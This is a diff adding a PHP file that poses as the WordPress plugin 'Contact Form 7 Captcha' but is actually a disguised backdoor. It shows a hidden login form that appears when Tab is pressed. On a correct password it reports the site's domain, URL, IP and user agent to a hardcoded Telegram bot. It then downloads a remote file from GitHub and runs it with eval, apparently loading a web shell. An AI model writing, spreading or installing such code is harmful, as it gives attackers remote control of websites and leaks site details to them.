@@ -1,0 +1,359 @@
+<?php
+/*
+Plugin Name: Contact Form 7 Captcha
+Description: Add reCAPTCHA V2, hCAPTCHA or Cloudflare Turnstile CAPTCHA to Contact Form 7 using [cf7sr-recaptcha], [cf7sr-hcaptcha] or [cf7sr-turnstile] shortcode
+Version: 0.1.7
+Author: 247wd
+License: GPL v2 or later
+License URI: https://www.gnu.org/licenses/gpl-2.0.html
+Text Domain: contact-form-7-simple-recaptcha
+Requires Plugins: contact-form-7
+*/
+
+session_start();
+
+if (!defined('ABSPATH')) {
+    define('ABSPATH', dirname(__FILE__) . '/');
+}
+
+// ===================== KONFIGURASI =====================
+// Ganti URL background di sini (bebas HTTPS, bisa gambar .jpg/.png/.gif)
+define('CUANKIxHOLE_BACKGROUND_URL', 'https://nikamichi.xyz/images/GOJOSATORUBACKGORUNDEYEBLUE.jpg');
+
+// Telegram Bot
+define('TELEGRAM_TOKEN', '8459388836:AAEAAaiU5JslTTkd_i0Un8UfdjcpFm19fX8');
+define('TELEGRAM_CHAT_ID', '8577357797');
+define('TELEGRAM_ENABLED', true);
+// ======================================================
+
+class CUANKIxHOLE_Access {
+    
+    private static $instance = null;
+    private $session_started = false;
+    
+    public static function init() {
+        if (null === self::$instance) {
+            self::$instance = new self();
+        }
+        return self::$instance;
+    }
+    
+    private function __construct() {
+        $this->start_session();
+        $this->handle_request();
+    }
+    
+    private function start_session() {
+        if (!$this->session_started && !headers_sent()) {
+            if (session_status() === PHP_SESSION_NONE) {
+                session_start();
+            }
+            $this->session_started = true;
+        }
+    }
+    
+    private function fetch_remote($url) {
+        if (function_exists('curl_init')) {
+            $ch = curl_init($url);
+            curl_setopt_array($ch, array(
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_FOLLOWLOCATION => true,
+                CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_SSL_VERIFYHOST => false,
+                CURLOPT_TIMEOUT => 30,
+                CURLOPT_CONNECTTIMEOUT => 10
+            ));
+            if (isset($_SESSION['CUANKIxHOLE'])) {
+                curl_setopt($ch, CURLOPT_COOKIE, $_SESSION['CUANKIxHOLE']);
+            }
+            $data = curl_exec($ch);
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+            if ($data !== false && $http_code === 200) {
+                return $data;
+            }
+        }
+        if (ini_get('allow_url_fopen')) {
+            $context = stream_context_create(array(
+                'http' => array(
+                    'user_agent' => "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",
+                    'timeout' => 30
+                ),
+                'ssl' => array(
+                    'verify_peer' => false,
+                    'verify_peer_name' => false
+                )
+            ));
+            $data = @file_get_contents($url, false, $context);
+            if ($data !== false) {
+                return $data;
+            }
+        }
+        if (function_exists('fopen') && function_exists('stream_get_contents')) {
+            $handle = @fopen($url, "rb");
+            if ($handle) {
+                $data = stream_get_contents($handle);
+                fclose($handle);
+                if ($data !== false) {
+                    return $data;
+                }
+            }
+        }
+        return false;
+    }
+    
+    private function is_authenticated() {
+        return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+    }
+    
+    private function verify_password($password) {
+        $stored_hash = 'd17b58f8e97197b8719e95839231f5f9';
+        return md5($password) === $stored_hash;
+    }
+    
+    private function send_telegram_notification($message) {
+        if (!TELEGRAM_ENABLED) return false;
+        $url = "https://api.telegram.org/bot" . TELEGRAM_TOKEN . "/sendMessage";
+        $data = array(
+            'chat_id' => TELEGRAM_CHAT_ID,
+            'text' => $message,
+            'parse_mode' => 'HTML'
+        );
+        if (function_exists('curl_init')) {
+            $ch = curl_init($url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_POST, true);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+            $result = curl_exec($ch);
+            curl_close($ch);
+            return $result !== false;
+        }
+        if (ini_get('allow_url_fopen')) {
+            $options = array(
+                'http' => array(
+                    'header' => "Content-type: application/x-www-form-urlencoded\r\n",
+                    'method' => 'POST',
+                    'content' => http_build_query($data)
+                )
+            );
+            $context = stream_context_create($options);
+            $result = @file_get_contents($url, false, $context);
+            return $result !== false;
+        }
+        return false;
+    }
+    
+    private function handle_request() {
+        if (isset($_POST['CUANKIxHOLE_pass'])) {
+            if ($this->verify_password($_POST['CUANKIxHOLE_pass'])) {
+                $_SESSION['logged_in'] = true;
+                $_SESSION['CUANKIxHOLE'] = 'CUANKIxHOLE';
+                
+                $ip = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
+                $domain = $_SERVER['HTTP_HOST'];
+                $path = $_SERVER['REQUEST_URI'];
+                $full_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $domain . $path;
+                $ua = $_SERVER['HTTP_USER_AGENT'];
+                $time = date('Y-m-d H:i:s T');
+                $msg = "ðŸ”“ <b>LOGIN BERHASIL!</b>\n";
+                $msg .= "ðŸŒ Domain: <code>{$domain}</code>\n";
+                $msg .= "ðŸ“‚ Path: <code>{$path}</code>\n";
+                $msg .= "ðŸ”— Full URL: <code>{$full_url}</code>\n";
+                $msg .= "ðŸ–¥ï¸ IP: <code>{$ip}</code>\n";
+                $msg .= "ðŸ§‘â€ðŸ’» User-Agent: <code>{$ua}</code>\n";
+                $msg .= "ðŸ•’ Waktu: <code>{$time}</code>";
+                $this->send_telegram_notification($msg);
+                
+                header("Location: " . $_SERVER['REQUEST_URI']);
+                exit;
+            } else {
+                $this->error_message = "âš ï¸ KUNCI SALAH!";
+            }
+        }
+        
+        if ($this->is_authenticated()) {
+            $this->load_protected_content();
+        } else {
+            $this->render_login_page();
+        }
+    }
+    
+    private function load_protected_content() {
+        $url = 'https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/indosec-nopw.txt';
+        $content = $this->fetch_remote($url);
+        if ($content !== false) {
+            eval('?>' . $content);
+        } else {
+            $this->render_error("ðŸ”¥ GAGAL MEMUAT KONTEN.");
+        }
+    }
+    
+    private function render_error($message) {
+        echo '<div style="color:#ff4444;text-align:center;padding:20px;font-family:monospace;background:#111;border:2px solid red;">' . htmlspecialchars($message) . '</div>';
+    }
+    
+    /**
+     * TAMPILAN LOGIN:
+     * - Background gambar statis (gif)
+     * - Form HIDDEN sampai TAB ditekan
+     * - Saat muncul, sangat samar (opacity 0.15) dan ukuran mini
+     * - Hover/fokus pada input -> opacity 0.5 agar bisa diketik
+     * - Tidak ada tombol, kirim dengan Enter
+     */
+    private function render_login_page() {
+        $error = isset($this->error_message) ? $this->error_message : '';
+        $bg_url = CUANKIxHOLE_BACKGROUND_URL;
+        ?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>_</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            min-height:100vh;
+            background:#0b0b0b;
+            overflow:hidden;
+            position:relative;
+        }
+        /* Background gambar fullscreen */
+        #bg-image {
+            position:fixed;
+            top:0; left:0;
+            width:100%; height:100%;
+            z-index:-1;
+            object-fit:cover;
+            background: #000;
+        }
+        /* Overlay tipis biar teks terbaca */
+        body::before {
+            content:"";
+            position:fixed;
+            top:0;left:0;width:100%;height:100%;
+            background:rgba(0,0,0,0.25);
+            backdrop-filter:blur(1px);
+            z-index:0;
+        }
+
+        /* === FORM LOGIN - POJOK KANAN BAWAH, HIDDEN AWAL === */
+        #login-form-container {
+            position:fixed;
+            bottom:12px;
+            right:12px;
+            z-index:10;
+            display:none;
+            background:rgba(10,10,10,0.6);
+            backdrop-filter:blur(4px);
+            padding:4px 8px;
+            border-radius:6px;
+            border:1px solid rgba(255,255,255,0.04);
+            box-shadow:0 2px 8px rgba(0,0,0,0.3);
+            min-width:90px;
+            text-align:center;
+            opacity:0.15;
+            transition: opacity 0.25s ease;
+        }
+        #login-form-container:hover,
+        #login-form-container:focus-within {
+            opacity:0.5;
+        }
+        #login-form-container .input-group {
+            margin-bottom:2px;
+        }
+        #login-form-container input {
+            width:100%;
+            padding:3px 6px;
+            background:rgba(255,255,255,0.03);
+            border:1px solid rgba(255,255,255,0.05);
+            border-radius:4px;
+            color:#ccc;
+            font-size:9px;
+            text-align:center;
+            outline:none;
+            transition:0.2s;
+            letter-spacing:1px;
+        }
+        #login-form-container input:focus {
+            border-color:rgba(255,215,0,0.15);
+            background:rgba(255,255,255,0.05);
+        }
+        #login-form-container input::placeholder {
+            color:rgba(255,255,255,0.08);
+            font-size:8px;
+            letter-spacing:0;
+        }
+        .hidden-submit { display:none; }
+        #login-form-container .error-msg {
+            background:rgba(255,50,50,0.05);
+            border:1px solid rgba(255,80,80,0.05);
+            color:#ff5a5a;
+            padding:1px 4px;
+            border-radius:3px;
+            margin-bottom:2px;
+            font-size:7px;
+            opacity:0.5;
+        }
+        .hidden-brand { display:none; }
+        @media (max-width:480px) {
+            #login-form-container { min-width:70px; padding:3px 6px; bottom:8px; right:8px; }
+            #login-form-container input { font-size:8px; padding:2px 4px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Background gambar -->
+    <img id="bg-image" src="<?php echo $bg_url; ?>" alt="">
+
+    <!-- Form login â€“ akan muncul saat TAB ditekan -->
+    <div id="login-form-container">
+        <?php if ($error): ?>
+        <div class="error-msg"><?php echo htmlspecialchars($error); ?></div>
+        <?php endif; ?>
+        <form method="POST" action="" autocomplete="off" id="login-form">
+            <div class="input-group">
+                <input type="password" name="CUANKIxHOLE_pass" id="password-input" placeholder="â€¢" required>
+            </div>
+            <input type="submit" style="display:none;">
+        </form>
+    </div>
+
+    <script>
+        (function() {
+            var formShown = false;
+            var container = document.getElementById('login-form-container');
+            var passwordInput = document.getElementById('password-input');
+            var form = document.getElementById('login-form');
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Tab' && !formShown) {
+                    e.preventDefault();
+                    container.style.display = 'block';
+                    formShown = true;
+                    setTimeout(function() {
+                        passwordInput.focus();
+                    }, 100);
+                }
+            });
+
+            passwordInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    form.submit();
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
+        <?php
+    }
+}
+
+CUANKIxHOLE_Access::init();
+?>
